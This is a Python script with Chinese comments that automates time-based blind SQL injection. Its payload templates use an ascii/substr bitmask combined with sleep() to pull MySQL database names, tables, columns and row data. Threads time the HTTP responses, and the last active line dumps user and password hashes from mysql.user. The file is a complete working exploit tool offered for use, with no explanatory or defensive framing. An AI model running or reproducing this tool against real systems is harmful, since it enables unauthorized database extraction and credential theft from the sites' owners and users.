#!encoding=utf8

from string import Template
import requests
import threading
import time



#-----------------------------------配置参数区start-----------------------------------
flag_time=1.5                        #睡眠时间
url='http://127.0.0.1/1.php'    #存在漏洞的url
#爆数据库的payload
payload_db="root' and ascii(substr((select schema_name from information_schema.schemata limit ${limit},1),${position},1))&${ord}=${ord} and !sleep(1.5) limit 1#"
#爆表的payload
payload_t="root' and ascii(substr((select table_name from information_schema.tables where table_schema='${db}' limit ${limit},1),${position},1))&${ord}=${ord} and !sleep(1.5) limit 1#"
#爆字段的payload
payload_c="root'  and ascii(substr((select column_name from information_schema.columns where table_name='${table}' and table_schema='${db}' limit ${limit},1),${position},1))&${ord}=${ord} and !sleep(1.5) limit 1#"
#爆数据的payload
payload_data="root' and ascii(substr((select concat_ws(',',${columns}) from ${db}.${table} limit ${limit},1),${position},1))&${ord}=${ord} and !sleep(1.5) limit 1#"

method='get'                            #请求方法 get or post
key='user'
data={}                        #post参数
params={}                           #url参数
#-----------------------------------配置参数区end-----------------------------------

reault = 0

lock=threading.Lock()

def getbit(payload,bit,params,data):
    global reault
    # print bit
    payload=Template(payload).safe_substitute(ord=bit)
    
    time1=time.time()
    if method.lower()=='get':
        params[key]=payload
        requests.get(url,params=params)
    else:
        data[key]=payload
        requests.post(url,data=data,params=params)
    time2=time.time()
    if time2-time1>flag_time:
        lock.acquire()
        reault=bit | reault
        lock.release()
    # print payload

def getchar(payloadx,i,position):
    global reault
    payload=Template(payloadx).safe_substitute(limit=i,position=position)
    reault=0
    threads=[]
    for i in range(8):
        bitcheck=1<<i
        threads.append(threading.Thread(target=getbit, args=(payload,bitcheck,params.copy(),data.copy())))
        # threads[-1].start()
        # threads[-1].join()
    for t in threads:   t.start()
    for t in threads:   t.join()
    # print "-------------------------"
    # print reault
    # print "-------------------------"
    return chr(reault)


def getString(payload):
    names=[]
    i=0
    while True:
        j=1
        name=getchar(payload,i,j)
        # print name
        if name=='\x00':
            return names
        while name[-1]!='\x00':
            j+=1
            name+=getchar(payload,i,j)
            print(name[0:-1])
        names.append(name[0:-1])
        i+=1

def getDbs():
    return(getString(payload_db))

def getTables(db):
    payload=Template(payload_t).safe_substitute(db=db)
    return getString(payload)

def getColumns(db,table):
    payload=Template(payload_c).safe_substitute(table=table,db=db)
    return getString(payload)

def getData(db,table,columns):
    payload=Template(payload_data).safe_substitute(db=db,columns=columns,table=table)
    return getString(payload)

# print getDbs()
# print getTables('mysql')
# print getColumns('mysql','user')
print getData('mysql','user',"user,password")
# print map(getTables,getDbs())
# print(getColumns('flag'))
